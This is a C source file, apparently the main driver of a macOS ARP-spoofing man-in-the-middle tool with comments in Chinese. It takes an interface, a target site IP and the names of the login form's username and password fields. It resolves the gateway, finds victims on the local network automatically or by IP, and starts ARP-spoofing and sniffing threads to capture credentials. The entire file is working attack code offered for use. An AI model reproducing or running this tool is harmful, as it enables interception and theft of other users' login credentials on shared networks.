#include "common.h"
#include "tools.h"
#include "arp.h"
#include "sniffer.h"

int main(int argc, char *argv[]) {
    // 參數順序：介面, 目標網站IP, 帳號欄位名, 密碼欄位名, [可選:受害者IP]
    if (argc < 5 || argc > 6) {
        printf("Usage:\n");
        printf("  [Auto]   sudo ./mac_mitm <Interface> <Target IP> <User Key> <Pass Key>\n");
        printf("  [Manual] sudo ./mac_mitm <Interface> <Target IP> <User Key> <Pass Key> <Victim IP>\n");
        printf("\nExample: sudo ./mac_mitm en0 44.228.249.3 username password\n");
        return -1;
    }

    MitmContext ctx;
    memset(&ctx, 0, sizeof(MitmContext));
    
    // 1. 解析基本參數
    strncpy(ctx.interface, argv[1], 19);
    inet_pton(AF_INET, argv[2], &ctx.target_site_ip);

    // 2. 解析關鍵字參數
    strncpy(ctx.user_key, argv[3], 30);
    strncpy(ctx.pass_key, argv[4], 30);
    
    // 自動補上 "=" 
    strcat(ctx.user_key, "=");
    strcat(ctx.pass_key, "=");

    printf("[*] Target Site IP: %s\n", argv[2]);
    printf("[*] Sniffing Keys: '%s', '%s'\n", ctx.user_key, ctx.pass_key);

    // 3. 解析受害者 IP
    if (argc == 6) {
        inet_pton(AF_INET, argv[5], &ctx.victim_ip);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    uint32_t netmask;
    
    // 4. 取得本機資訊
    if (get_mac_os_info(ctx.interface, &ctx.my_ip, ctx.my_mac, &netmask) < 0) {
        fprintf(stderr, "[-] Failed to get local info. Check interface name.\n");
        return -1;
    }
    
    // 5. 取得 Gateway
    if (get_default_gateway_mac_os(&ctx.gateway_ip) < 0) return -1;
    print_ip("[*] Gateway", ctx.gateway_ip);

    // Open Pcap
    ctx.handle = pcap_open_live(ctx.interface, 65536, 1, 100, errbuf);
    if (!ctx.handle) return -1;

    // Resolve Gateway MAC
    printf("[*] Resolving Gateway MAC...\n");
    if (get_mac_of_ip(ctx.handle, ctx.my_mac, ctx.my_ip, ctx.gateway_ip, ctx.gateway_mac) < 0) {
        fprintf(stderr, "[-] Failed to resolve Gateway MAC.\n");
        return -1;
    }
    print_mac("[+] Gateway MAC", ctx.gateway_mac);

    // Initial Scan / Resolve Victim
    if (ctx.victim_ip == 0) {
        printf("[*] Auto-Scan Mode. Starting initial scan...\n");
        scan_network_for_victim(ctx.handle, ctx.my_ip, ctx.gateway_ip, netmask, ctx.my_mac);
    } else {
        printf("[*] Manual Mode. Resolving Victim MAC...\n");
        while (get_mac_of_ip(ctx.handle, ctx.my_mac, ctx.my_ip, ctx.victim_ip, ctx.victim_mac) < 0) {
            fprintf(stderr, "[-] Retrying...\n");
            sleep(1);
        }
        print_mac("[+] Victim MAC", ctx.victim_mac);
        // 手動加入列表
        ctx.targets[0].ip = ctx.victim_ip;
        memcpy(ctx.targets[0].mac, ctx.victim_mac, 6);
        ctx.targets[0].active = 1;
        ctx.target_count = 1;
    }
    
    // Reopen Pcap with low latency for sniffing
    pcap_close(ctx.handle);
    ctx.handle = pcap_open_live(ctx.interface, 65536, 1, 1, errbuf);

    printf("\n[!!!] SYSTEM STARTED [!!!]\n");
    
    pthread_t t1, t2;
    pthread_create(&t1, NULL, arp_scan_loop, &ctx);
    pthread_create(&t2, NULL, arp_spoof_loop, &ctx);

    start_sniffer(&ctx);

    pcap_close(ctx.handle);
    return 0;
}